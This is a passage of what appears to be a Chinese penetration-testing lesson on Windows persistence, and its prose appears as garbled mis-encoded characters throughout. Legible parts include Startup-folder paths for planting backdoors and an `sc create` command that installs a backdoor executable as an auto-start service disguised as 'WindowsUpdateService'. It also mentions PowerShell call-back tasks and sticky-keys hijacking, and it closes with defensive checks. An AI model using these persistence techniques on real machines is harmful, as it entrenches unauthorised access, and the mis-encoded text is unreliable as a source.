### 4. å¯åŠ¨æ–‡ä»¶å¤¹
å°†åé—¨ç¨‹åºæˆ–å¿«æ·æ–¹å¼æ”¾å…¥ä»¥ä¸‹ç›®å½•ï¼Œç”¨æˆ·ç™»å½•æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œï¼š
*   ç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹ï¼š`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
*   å½“å‰ç”¨æˆ·å¯åŠ¨æ–‡ä»¶å¤¹ï¼š`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
æ­¤æ–¹æ³•è¾ƒä¸ºå®¹æ˜“è¢«å‘ç°ã€‚

### 5. æœåŠ¡åé—¨
ä½¿ç”¨`sc`å‘½ä»¤åˆ›å»ºè‡ªå®šä¹‰æœåŠ¡ã€‚
```cmd
sc create "WindowsUpdateService" binPath= "C:\path\to\backdoor.exe" start= auto
sc start WindowsUpdateService
```

### 6. PowerShellè„šæœ¬åé—¨
åˆ©ç”¨PowerShellçš„çµæ´»æ€§å’Œå…æ€ç‰¹æ€§ï¼Œå¯ä»¥ç¼–å†™å¤æ‚çš„æŒä¹…åŒ–è„šæœ¬ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨`Invoke-TaskBackdoor`ç­‰è„šæœ¬åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œå®šæœŸå›è¿ã€‚

---

## æ€»ç»“ä¸å›é¡¾ ğŸ“š

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_201.png)

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†Windowsç³»ç»Ÿä¸‹å¤šç§æƒé™ç»´æŒæŠ€æœ¯ï¼š

1.  **Meterpreterå†…ç½®å·¥å…·**ï¼š`persistence`ï¼ˆæ³¨å†Œè¡¨VBSè„šæœ¬ï¼‰å’Œ`metsvc`ï¼ˆæœåŠ¡åé—¨ï¼‰ï¼Œé€‚åˆåœ¨å·²è·å¾—Meterpreterä¼šè¯åå¿«é€Ÿéƒ¨ç½²ã€‚
2.  **ç³»ç»Ÿå·¥å…·åŠ«æŒ**ï¼šåˆ©ç”¨è¾…åŠ©åŠŸèƒ½ï¼ˆç²˜æ»é”®ã€å±å¹•é”®ç›˜ç­‰ï¼‰åœ¨ç™»å½•ç•Œé¢è§¦å‘åé—¨ï¼Œæ— éœ€ç”¨æˆ·å¯†ç ï¼Œéå¸¸éšè”½ã€‚
3.  **æ³¨å†Œè¡¨è‡ªå¯åŠ¨é¡¹**ï¼šåˆ©ç”¨`Run`ã€`RunOnce`ç­‰é”®å€¼å®ç°å¼€æœºæˆ–ç™»å½•è‡ªå¯ï¼Œæ˜¯ç»å…¸æŒä¹…åŒ–ä½ç½®ã€‚
4.  **å…¶ä»–æŠ€å·§**ï¼šåŒ…æ‹¬è®¡åˆ’ä»»åŠ¡ã€å¿«æ·æ–¹å¼åŠ«æŒã€éšè—/å…‹éš†ç”¨æˆ·è´¦æˆ·ã€å¯åŠ¨æ–‡ä»¶å¤¹ã€æœåŠ¡åé—¨å’ŒPowerShellè„šæœ¬ç­‰ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_203.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_205.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_207.png)

**é˜²å¾¡å»ºè®®**ï¼š
*   å®šæœŸæ£€æŸ¥æ³¨å†Œè¡¨å¸¸è§è‡ªå¯åŠ¨è·¯å¾„ã€‚
*   ç›‘æ§ç³»ç»ŸæœåŠ¡åˆ—è¡¨ï¼Œè­¦æƒ•é™Œç”ŸæœåŠ¡ã€‚
*   æ£€æŸ¥è®¡åˆ’ä»»åŠ¡ï¼Œç‰¹åˆ«æ˜¯ä»¥é«˜æƒé™è¿è¡Œçš„ä»»åŠ¡ã€‚
*   æ³¨æ„ç™»å½•ç•Œé¢è¾…åŠ©åŠŸèƒ½çš„å¼‚å¸¸è¡Œä¸ºã€‚
*   ä½¿ç”¨å®‰å…¨è½¯ä»¶å¹¶ä¿æŒæ›´æ–°ã€‚
*   å¯¹æ³¨å†Œè¡¨`SAM`ç­‰å…³é”®ä½ç½®è®¾ç½®ä¸¥æ ¼æƒé™ã€‚

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_209.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_211.png)

![](img/ad6ee6407c96a80d664d4d4e5c5d68c5_213.png)

æƒé™ç»´æŒæ˜¯æ¸—é€æµ‹è¯•ä¸­å·©å›ºæˆ˜æœçš„å…³é”®ä¸€æ­¥ï¼Œä½†åŒæ—¶ä¹Ÿæ˜¯é˜²å®ˆæ–¹éœ€è¦é‡ç‚¹å¸ƒé˜²çš„é¢†åŸŸã€‚ç†è§£æ”»å‡»æ‰‹æ³•ï¼Œæ‰èƒ½æ›´å¥½åœ°è¿›è¡Œé˜²å¾¡ã€‚